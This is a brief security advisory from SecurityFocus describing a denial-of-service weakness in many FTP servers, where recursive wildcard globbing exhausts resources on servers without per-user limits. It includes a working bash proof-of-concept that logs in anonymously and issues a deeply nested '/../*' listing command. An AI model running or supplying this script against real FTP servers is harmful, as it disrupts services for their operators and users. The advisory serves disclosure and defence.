source: http://www.securityfocus.com/bid/2496/info

Many FTP servers are vulnerable to a denial of service condition resulting from poor globbing algorithms and user resource usage limits.

Globbing generates pathnames from file name patterns used by the shell, eg. wildcards denoted by * and ?, multiple choices denoted by {}, etc.

The vulnerable FTP servers can be exploited to exhaust system resources if per-user resource usage controls have not been implemented. 

#!/bin/bash=20
ftp -n FTP-SERVER<<\end=20
quot user anonymous
bin
quot pass shitold@bug.com
ls /../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*
bye=20
end=20 